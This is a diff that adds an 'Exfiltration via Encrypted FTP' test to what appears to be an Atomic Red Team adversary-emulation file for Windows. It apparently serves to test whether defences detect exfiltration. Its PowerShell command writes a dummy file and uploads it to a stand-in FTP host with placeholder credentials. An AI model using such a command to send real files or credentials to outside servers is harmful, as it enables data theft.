@@ -29,3 +29,33 @@ atomic_tests:
       $fileName = "#{file}"
       Remove-Item -Path $fileName -ErrorAction Ignore
     name: powershell
+
+- name: Exfiltration via Encrypted FTP
+  auto_generated_guid: 5b380e96-b0ef-4072-8a8e-f194cb9eb9ac
+  description: Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.
+  supported_platforms:
+    - windows
+  input_arguments:
+    sampleFile:
+      description: Path of the sample file to exfiltrate.
+      type: String
+      default: C:\temp\T1020__FTP_sample.txt
+    ftpServer:
+      description: FTP server URL.
+      type: Url
+      default: ftp://example.com
+    credentials:
+      description: FTP server credentials.
+      type: String
+      default: "[user:password]"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $sampleData = "Sample data for exfiltration test"
+      Set-Content -Path "#{sampleFile}" -Value $sampleData
+      $ftpUrl = "#{ftpServer}"
+      $creds = Get-Credential -Credential "#{credentials}"
+      Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
+    cleanup_command: |
+      Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
